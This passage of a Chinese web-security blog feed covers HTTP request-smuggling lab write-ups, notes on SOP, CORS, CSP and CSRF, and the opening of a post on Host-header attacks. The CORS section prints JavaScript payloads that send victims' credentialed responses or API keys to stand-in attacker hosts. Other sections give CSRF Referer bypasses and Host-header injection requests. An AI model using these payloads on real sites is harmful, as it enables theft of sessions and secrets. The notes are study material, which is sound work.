src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101210926816.png"></p><p>首先明确这是个CL.TE</p><p>有很多参数，要把comment放到最后用于拼接，这个参数最不容易报错，限制最小，也容易查看</p><p>最后一直试到920得到有效信息session，1000时直接超时。说明太大了</p><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101214307891.png"></p><p>不断查看评论，等受害者接上我的魔改包</p><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101214313953.png"></p><h3 id="实验10：利HTTP-请求走私实现反射型-XSS-攻击"><a href="#实验10：利HTTP-请求走私实现反射型-XSS-攻击" class="headerlink" title="实验10：利HTTP 请求走私实现反射型 XSS 攻击"></a>实验10：利HTTP 请求走私实现反射型 XSS 攻击</h3><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101220034769.png"></p><p>看题目确定这是CL.TE走私</p><p>在发送评论的包里 发现，DOM自动编码了符号阻止了直接的XSS，但多了一个参数UA很可疑</p><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101221121291.png"></p><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101220452816.png"></p><p>但不是用添加评论的路由的参数赋值改的，而是GET访问页面的UA标头决定的</p><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101221105739.png"></p><p>本地测试反射xss成功</p><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101221227356.png"></p><p>后面就是通过http请求走私，是受害者访问UA附带XSS</p><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101222043923.png"></p><h3 id="实验11：HTTP请求走私-Web缓存投毒"><a href="#实验11：HTTP请求走私-Web缓存投毒" class="headerlink" title="实验11：HTTP请求走私+Web缓存投毒"></a>实验11：HTTP请求走私+Web缓存投毒</h3><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101224842932.png"></p><p>找到了有缓存机制的文件tracking.js</p><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101225329695.png"></p><p>且在根目录有对这个文件的解析使用</p><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101225354747.png"></p><p>这里很明显就是有可能投毒的部分，在普通的Cache投毒中，需要想方设法覆盖这个js文件写入缓存或者产生一个重定向漏洞</p><p>这里，发布评论后会产生一个重定向</p><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101230213901.png"></p><p>不好利用，还有一个查看下一篇的功能，这里是绝对路径跳转</p><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101231122574.png"></p><p>构造一个请求走私</p><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101234757098.png"></p><p>再发一个正常包，发现接上了我构造的重定向</p><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101234826909.png"></p><p>再试一次，有缓存的静态文件访问写入了重定向Cache</p><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101235255723.png"></p><p>然后再依据路径更改一下我的攻击者服务器路径</p><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101235632350.png"></p><p>再走一遍流程：构造一个魔改包，为了让后面的Cache机制写入的缓存不是静态文件tracking.js而是重定向请求。然后配合魔改包访问tracking.js正常包写入重定向缓存，这时别人访问更目录自动触发tracking.js会读缓存重定向到我的攻击者服务器</p><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101235620747.png"></p><h3 id="实验12：HTTP请求走私-Web缓存欺骗"><a href="#实验12：HTTP请求走私-Web缓存欺骗" class="headerlink" title="实验12：HTTP请求走私+Web缓存欺骗"></a>实验12：HTTP请求走私+Web缓存欺骗</h3><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251102002304135.png"></p><p>我们的目的是窃取APIkey，这是在用户界面的</p><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251102002721863.png"></p><p>经过检索网站，找到有缓存的静态文件tracking.js</p><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251102002902474.png"></p><p>想法就是构造魔改包，拼接静态文件，让受害者原本写入静态文件缓存结果魔改到了api界面，写入了api的缓存，随后访问一下tracking.js就能读到API</p><p>我简单构造了第一个魔改包，但发正常包一直重定向到login而不是受害者的信息页</p><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251102004009682.png"><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251102004039369.png"></p><p>意识到可能是没带上cookie，那就要换一个写法了，<img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251102004159867.png"></p><p>用Header拼接而不是参数，这样能带上受害者的所有Header（cookie）   而不是像参数法，会因为内层CL而截断受害者的cookie</p>]]></content>
    
    
    <categories>
      
      <category>web安全专题</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SOP,CORS,CSRF混淆区分</title>
    <link href="/2025/10/30/CSRF/"/>
    <url>/2025/10/30/CSRF/</url>
    
    <content type="html"><![CDATA[<p>这里记录一下一直混淆的几个点，CORS，SOP，CSP</p><h2 id="SOP（同源策略）"><a href="#SOP（同源策略）" class="headerlink" title="SOP（同源策略）"></a>SOP（同源策略）</h2><p>​<strong><code>同源策略</code>用于防止不同源的网页相互访问敏感数据</strong>（读取另一个网站的 <code>cookie</code>、<code>localStorage</code>、<code>DOM</code>或防止跨站点脚本直接操作另一个站点的页面。）</p><ul><li><p>同源：协议，域名，端口全部相同</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://a.example.com:443 与 https://a.example.com:443  ✅ 同源  <br>https://a.example.com 与 http://a.example.com ❌ 不同源（协议不同）  <br>https://a.example.com 与 https://b.example.com ❌ 不同源（域名不同）          <br></code></pre></td></tr></table></figure><p>只要协议、域名或端口不同，浏览器就会<strong>阻止</strong>页面中的脚本访问另一个源的内容。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 当前页面: https://a.com</span><br><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;https://b.com/data&quot;</span>)<br></code></pre></td></tr></table></figure><p>SOP通常是单向的，会阻止脚本访问返回的数据（即fetch请求可能会发出去，但返回的数据在浏览器里是 <strong>被隔离的</strong>，JS 拿不到内容）</p></li></ul><h2 id="CORS（跨域资源共享）"><a href="#CORS（跨域资源共享）" class="headerlink" title="CORS（跨域资源共享）"></a>CORS（跨域资源共享）</h2><p>​<strong>CORS 是对同源策略的“安全放行机制”</strong>。</p><p>​它允许服务器声明哪些源可以访问自己的资源，从而在受控的情况下<strong>突破 SOP 限制</strong>。</p><p>​浏览器发起跨域请求，会根据请求类型分为</p><ul><li><strong>简单请求（simple request）</strong>：直接发送请求；（GET、HEAD、POST，不能自定义标头，）</li><li><strong>复杂请求（non-simple request）</strong>：会先发送一个 <strong>预检请求（OPTIONS）</strong>。</li></ul><p>​服务器通过请求头告知服务器是否允许跨域请求</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Access-Control-Allow-Origin</span><span class="hljs-punctuation">: </span>https://example.com<br><span class="hljs-attribute">Access-Control-Allow-Methods</span><span class="hljs-punctuation">: </span>GET, POST<br><span class="hljs-attribute">Access-Control-Allow-Credentials</span><span class="hljs-punctuation">: </span>true<br></code></pre></td></tr></table></figure><details><summary>**展开查看具体过程**</summary><ol><li><p>JS 发起一个跨域请求（比如 a.com 请求 b.com）。</p></li><li><p>浏览器发现这是跨域的，根据 SOP 本该禁止读取响应。</p></li><li><p>但是浏览器会先看看 b.com 的响应头中有没有：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Access-Control-Allow-Origin</span><span class="hljs-punctuation">: </span>https://a.com<br></code></pre></td></tr></table></figure></li><li><p>如果有，说明服务器明确允许 a.com 访问自己的资源。</p></li><li><p>浏览器就放行，让 JS 能读到响应内容。</p><p>这里解释一下，简单请求是直接发出请求，复杂请求要先发一个OPtion，响应中的请求头允许跨域才会真正发送请求</p><p>所以执行CSRF尽量使用简单请求</p></li></ol></details><h3 id="CORS安全漏洞"><a href="#CORS安全漏洞" class="headerlink" title="CORS安全漏洞"></a>CORS安全漏洞</h3><ol><li><p>一些应用程序为了方便，允许从任何其他域进行访问。</p><p>一种方法是读取请求中的 Origin 标头，并在响应标头中添加声明允许该请求来源的字段。例如，假设一个应用程序收到以下请求：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs http">GET /sensitive-victim-data HTTP/1.1 <br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>vulnerable-website.com <br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>test.com <br>Cookie:<br></code></pre></td></tr></table></figure><p>然后它回应道：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK <br><span class="hljs-attribute">Access-Control-Allow-Origin</span><span class="hljs-punctuation">: </span>test.com <br><span class="hljs-attribute">Access-Control-Allow-Credentials</span><span class="hljs-punctuation">: </span>true<br></code></pre></td></tr></table></figure><p>这种情况下很危险,随意就能绕过SOP,获得回显,</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> req = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>req.<span class="hljs-property">onload</span> = reqListener;<br>req.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;get&#x27;</span>,<span class="hljs-string">&#x27;https://要窃取的网站/sensitive-victim-data&#x27;</span>,<span class="hljs-literal">true</span>);<br>req.<span class="hljs-property">withCredentials</span> = <span class="hljs-literal">true</span>;<br>req.<span class="hljs-title function_">send</span>();<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">reqListener</span>(<span class="hljs-params"></span>) &#123;<br>location=<span class="hljs-string">&#x27;//malicious-website.com/log?key=&#x27;</span>+<span class="hljs-variable language_">this</span>.<span class="hljs-property">responseText</span>;<br>&#125;;<br></code></pre></td></tr></table></figure></li><li><p>Origin白名单问题设置  </p><p>一些支持多源访问的网站通过白名单比较,这其中可能产生的情况就是</p><ul><li><p>简单前后缀匹配绕过</p></li><li><p>Null值</p><p>开发者为了调试,想允许 <code>file://</code>、<code>data:</code> 或本地页面发起跨域请求，因此把 <code>Access-Control-Allow-Origin: null</code> 或允许 <code>Origin: null</code> 当成“允许本地或开发来源”的快捷方式。</p><p>可以利用<code>iframe</code>形式的沙盒跨域请求绕过</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;iframe sandbox=<span class="hljs-string">&quot;allow-scripts allow-top-navigation allow-forms&quot;</span> src=<span class="hljs-string">&quot;data:text/html,&lt;script&gt;</span><br><span class="hljs-string">var req = new XMLHttpRequest();</span><br><span class="hljs-string">req.onload = reqListener;</span><br><span class="hljs-string">req.open(&#x27;get&#x27;,&#x27;vulnerable-website.com/sensitive-victim-data&#x27;,true);</span><br><span class="hljs-string">req.withCredentials = true;</span><br><span class="hljs-string">req.send();</span><br><span class="hljs-string"></span><br><span class="hljs-string">function reqListener() &#123;</span><br><span class="hljs-string">location=&#x27;malicious-website.com/log?key=&#x27;+this.responseText;</span><br><span class="hljs-string">&#125;;</span><br><span class="hljs-string">&lt;/script&gt;&quot;</span>&gt;&lt;/iframe&gt;<br></code></pre></td></tr></table></figure><p>使用 <code>iframe</code>的<code>sandbox</code> 属性可以产生空源请求。从 <code>iframe</code> 进行请求，需要使用绝对路径将日志写入攻击者服务器</p></li></ul></li><li><p>即使配置已经严格,但假设信任的源存在XSS,利用 XSS 仍能通过跨源资源请求窃取敏感数据</p><p>例如<code>a.com</code>只信任<code>b.com</code>,a允许b获取信息,但<code>b.com</code>存在XSS.</p><p>那么攻击者就可以利用 XSS 在当前发起对 a 网站的跨源资源请求</p><p>把xss的alert换成下面的<code>payload</code>(fetch写法),就能往攻击者服务器发送cookie</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<br><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://a/api/requestApiKey&#x27;</span>, &#123;<br>  <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;GET&#x27;</span>,<br>  <span class="hljs-attr">credentials</span>: <span class="hljs-string">&#x27;include&#x27;</span>   <span class="hljs-comment">// 关键：让浏览器带上 cookie / 会话凭证</span><br>&#125;)<br>.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">resp</span> =&gt;</span> resp.<span class="hljs-title function_">text</span>())<br>.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">secret</span> =&gt;</span> &#123;<br>  <span class="hljs-comment">// 把秘密发回攻击者服务器（exfiltrate）</span><br>  <span class="hljs-keyword">new</span> <span class="hljs-title class_">Image</span>().<span class="hljs-property">src</span> = <span class="hljs-string">&#x27;https://attacker.example.com/log?d=&#x27;</span> + <span class="hljs-built_in">encodeURIComponent</span>(secret);<br>&#125;);<br>&lt;/script&gt;<br><br></code></pre></td></tr></table></figure><p>所以如果受害者点击(xHR写法)(如果b可以被很多源访问,就达成了借B杀A)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<br>    <span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>=<span class="hljs-string">&quot;https://b/?xss=&lt;script&gt;var req = new XMLHttpRequest(); req.onload = reqListener; req.open(&#x27;get&#x27;,&#x27;https://a/accountDetails&#x27;,true); req.withCredentials = true;req.send();function reqListener() &#123;location=&#x27;https://攻击者服务器/log?key=&#x27;%2bthis.responseText; &#125;;%3c/script&gt;&quot;</span><br>&lt;/script&gt;<br></code></pre></td></tr></table></figure></li><li><p>防御</p><p>所以防止也很简单,就是严格的限制白名单,避免NULL</p></li></ol><h2 id="CSP（内容安全策略）"><a href="#CSP（内容安全策略）" class="headerlink" title="CSP（内容安全策略）"></a>CSP（内容安全策略）</h2><p>​**CSP 是浏览器提供的防御机制，用于防止 XSS和数据注入攻击。**它通过限制页面能加载哪些资源、执行哪些脚本，来减少攻击面。</p><p>​CSP通过响应头声明</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Content-Security-Policy</span><span class="hljs-punctuation">: </span>default-src &#x27;self&#x27;; script-src &#x27;self&#x27; https://cdn.example.com<br></code></pre></td></tr></table></figure><p>​这表示：</p><ul><li>所有资源默认只能从本源加载；</li><li>JS 脚本只能来自本站点或指定的 CDN；</li><li>禁止行内 <code>&lt;script&gt;</code> 执行（除非加 <code>&#39;unsafe-inline&#39;</code>）。</li></ul><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p><img src="/2025/10/30/CSRF/image-20251030203425958.png"></p><p>​CSRF的原理很简单,简单来说是就<strong>攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己以前认证过的站点并运行一些操作</strong>（如发邮件，发消息，甚至财产操作（如转账和购买商品））</p><p>​这里现先区分一个概念,站和源</p><p><img src="/2025/10/30/CSRF/image-20251030195714203.png"></p><p>SameSite 的工作原理是**使浏览器和网站所有者能够限制哪些跨站点请求（如果有）应包含特定 Cookie。**这有助于减少用户遭受 CSRF 攻击的风险，CSRF 攻击会诱使受害者的浏览器发出请求，从而在易受攻击的网站上触发有害操作。由于这些请求通常需要与受害者的身份验证会话关联的 cookie，因此如果浏览器不包含此 cookie，则攻击将失败。</p><p>所有主流浏览器当前都支持以下 SameSite 限制级别：</p><ul><li><p><a href="https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions#strict"><code>Strict</code> <code>严格</code></a> </p><p>​    浏览器不会在任何跨站点请求中发送该 Cookie。简单来说，这意味着，如果请求的目标站点与浏览器地址栏中当前显示的站点不匹配，则它将不包含 Cookie。</p></li><li><p><a href="https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions#lax"><code>Lax</code> <code>宽松</code></a></p><p>​    意味着浏览器将在跨站点请求中发送 Cookie，但前提是同时满足以下两个条件：</p><ul><li>该请求使用 <code>GET</code> 方法。</li><li>该请求是用户进行顶级导航（例如单击链接）的结果。</li></ul></li><li><p><a href="https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions#none"><code>None</code> <code>没有</code></a> </p><p>​    无论浏览器如何，这都会有效地完全禁用 SameSite 限制。因此，浏览器将在向发出此 Cookie 的站点发送此 Cookie 的所有请求中，即使是由完全不相关的第三方网站触发的请求。</p></li></ul><p>​所以现代网站通常是这样防御的：</p><table><thead><tr><th>机制</th><th>作用</th></tr></thead><tbody><tr><td><strong>SOP</strong></td><td>阻止跨域响应被读取（防止数据泄露）</td></tr><tr><td><strong>CSRF Token</strong></td><td>验证请求是否来自合法源（防止请求伪造）</td></tr><tr><td><strong>SameSite Cookie</strong></td><td>阻止跨站请求自动带上 cookie</td></tr><tr><td><strong>CORS</strong></td><td>只允许可信源读取响应数据</td></tr></tbody></table><h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击:"></a>攻击:</h3><p>​要进行CSRF攻击不过是构造简单的POC并尽量进行验证绕过</p><ul><li><p>换请求方式绕过验证<code>LAX</code></p></li><li><p>验证方式缺陷</p><ul><li>只验证有没有CSRF令牌</li><li>未绑定用户的令牌(随便用一个真实令牌)</li><li>CSRF令牌与非会话cookie相关联(注入一对csrf cookie和csrf token)</li><li>只验证双重CSRF是否相同(上一条两者一样的情况)</li></ul></li><li><p>SameSite有可能的漏洞</p><ul><li><p>对于LAX, 用 document.location函数来顶级导航 and 覆盖请求行中的method(Symfony)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;input type=<span class="hljs-string">&quot;hidden&quot;</span> name=<span class="hljs-string">&quot;_method&quot;</span> value=<span class="hljs-string">&quot;GET&quot;</span>&gt;<br></code></pre></td></tr></table></figure></li><li><p>对于Strict, 利用重定向</p><p>第一次攻击者网站诱骗受害者访问bank.com&#x2F;?payload,这时不会带cookie</p><p>如果构造的bank.com的url通过业内函数能向同站再发一次,就会绕过Strict</p></li><li><p>利用同站和同源的区别绕过STrict</p></li></ul></li><li><p>有些网站用Referer做防御</p><ul><li><p>使Referer消失(META 标签)</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;referrer&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;never&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>Referer的简单验证</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">http://vulnerable-website.com.attacker-website.com/csrf-attack<br>http://attacker-website.com/csrf-attack?vulnerable-website.com<br></code></pre></td></tr></table></figure></li></ul></li></ul><h3 id="预防："><a href="#预防：" class="headerlink" title="预防："></a>预防：</h3><ol><li>使用Token验证</li><li>验证Referer头部</li><li>SameSite Cookie属性<br>设置Cookie的SameSite属性为<code>Lax</code>或<code>Strict</code>，可以有效防止跨站请求携带Cookie。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 在Flask中设置SameSite属性 </span><br><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, make_response <br><br>app = Flask(__name__) <br><span class="hljs-meta">@app.after_request </span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_security_headers</span>(<span class="hljs-params">response</span>): <br>response.set_cookie(<span class="hljs-string">&#x27;session&#x27;</span>, value=<span class="hljs-string">&#x27;cookie_value&#x27;</span>, secure=<span class="hljs-literal">True</span>, httponly=<span class="hljs-literal">True</span>, samesite=<span class="hljs-string">&#x27;Lax&#x27;</span>) <br><span class="hljs-keyword">return</span> response<br></code></pre></td></tr></table></figure><ol start="4"><li><p>双Token机制</p><p>除了上述提到的单一Token验证外，还可以采用双Token机制。一个Token作为会话管理，存储在Cookie中；另一个Token作为请求验证，存储在本地存储（如localStorage）。每次请求时，除了表单中的Token，还需通过Ajax传递另一个Token，以此增加攻击难度。</p></li><li><p>时间戳与Nonce</p><p>在Token的基础上，增加时间戳和Nonce（一次性随机数），可以有效防止重放攻击。服务器验证请求时，不仅检查Token的有效性，还要确认时间戳在合理范围内且Nonce未被使用过。</p></li><li><p>CSP</p><p>通过设置严格的Content Security Policy，限制页面加载资源的能力，可以降低跨站脚本注入的风险，间接减少CSRF攻击的机会。</p></li><li><p>CSRF 令牌<br>CSRF 令牌是由服务器端应用程序生成并与客户端共享的唯一、秘密且不可预测的值。当尝试执行敏感操作（例如提交表单）时，客户端必须在请求中包含正确的 CSRF 令牌。这使得攻击者很难代表受害者构建有效的请求。</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>web安全专题</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>HTTP请求头攻击</title>
    <link href="/2025/10/28/HTTP%E4%B8%BB%E6%9C%BA%E5%A4%B4%E6%94%BB%E5%87%BB/"/>
    <url>/2025/10/28/HTTP%E4%B8%BB%E6%9C%BA%E5%A4%B4%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="HTTP-Host标头攻击"><a href="#HTTP-Host标头攻击" class="headerlink" title="HTTP Host标头攻击"></a>HTTP Host标头攻击</h1><p>​一些网站以不安全的方式处理Host标头的值（隐式信任 or 未转义等操作），攻击者就注入payload</p><p>​<strong>Host 标头是客户端（浏览器）向服务器发送请求时，用来告知服务器 “自己想访问哪个域名” 的标识</strong>，现成的web应用通常从Host中检索域来知道当前域：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://_SERVER[&#x27;HOST&#x27;]/support&quot;</span>&gt;</span>Contact support<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><p>​能造成的典型攻击：</p><ul><li>Web 缓存中毒</li><li>特定功能中的业务逻辑缺陷</li><li>基于路由的 SSRF</li><li>典型的服务器端漏洞，例如 SQL 注入</li></ul><p>产生漏洞的原因：</p><pre><code class="hljs">1. 错误的信任Host标头2. 配置问题，Host被其他标头覆盖</code></pre><h2 id="测试漏洞："><a href="#测试漏洞：" class="headerlink" title="测试漏洞："></a>测试漏洞：</h2><h3 id="1-提供任意Host头"><a href="#1-提供任意Host头" class="headerlink" title="1. 提供任意Host头"></a>1. 提供任意Host头</h3><p>​先测试通过Host提供任意、无法识别的域名时会发生什么；</p><ul><li><p>能访问：</p><p>有些服务器或代理会有 默认&#x2F;回退 配置，也就是当收到没有匹配到任何 <code>server_name</code> &#x2F; host 的请求时要处理哪个虚拟主机。换句话说：即便 Host 不匹配，服务器也把请求送给目标站点，我们要研究web如何处理host</p></li><li><p>失败（“Invalid Host header” &#x2F; 无法路由）</p><p>可能是白名单限制，不匹配规则，TLS&#x2F;SNI不匹配</p></li></ul><h3 id="2-检查验证是否存在缺陷"><a href="#2-检查验证是否存在缺陷" class="headerlink" title="2.检查验证是否存在缺陷"></a>2.检查验证是否存在缺陷</h3><ol><li><p>端口处理漏洞</p><p>有些验证逻辑只验证<strong>域名部分</strong>（<code>example.com</code>），忽略端口。那就把payload当做非数字端口注入</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/example</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>vulnerable-website.com:bad-stuff-here<br></code></pre></td></tr></table></figure></li><li><p>利用域名后缀匹配（子域&#x2F;尾缀匹配）</p></li></ol><p>   有些应用在验证 Host 时<strong>允许任意子域</strong>，只要 Host 以白名单域名结尾。例如，应用白名单是 <code>vulnerable-website.com</code>，它允许匹配 <code>*.vulnerable-website.com</code>。在这种情况下，您可以通过注册一个以与白名单域名相同的字符序列结尾的任意域名来完全绕过验证：</p>   <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/example</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>notvulnerable-website.com<br></code></pre></td></tr></table></figure><ol start="3"><li>其他方式有关<a href="https://portswigger.net/web-security/ssrf#circumventing-common-ssrf-defenses">规避常见 SSRF 防御</a>和<a href="https://portswigger.net/web-security/cors#errors-parsing-origin-headers">Origin 标头解析错误</a>的内容</li></ol><h3 id="3-发送歧义请求"><a href="#3-发送歧义请求" class="headerlink" title="3.发送歧义请求"></a>3.发送歧义请求</h3><p>当验证 Host 的代码和实际<strong>使用</strong> Host 的代码不在同一个组件或服务器时，攻击者可以构造“歧义”请求，使得“前端看到一个 Host、后端看到另一个 Host”，进而绕过校验并把恶意值注入到后端逻辑中。</p><ol><li><p>重复 Host 头</p><p>类似于http参数污染</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/example</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>vulnerable-website.com   有的组件取第一个值<br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>attacker.example         有的取最后一个，有的将多值合并成逗号分隔字符串<br></code></pre></td></tr></table></figure></li><li><p>请求行使用绝对 URL</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">http://vulnerable-website.com/path</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>attacker.example<br></code></pre></td></tr></table></figure><p>在某些链路上，路由&#x2F;代理可能优先使用请求行里的 URL 主机（来决定目的地），而后端或应用层读取 <code>Host</code> header。若两者不一致，就能制造歧义（类似前面重复头的效果）。</p></li><li><p>折行 &#x2F; 行包裹</p></li></ol>   <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/example</span> <span 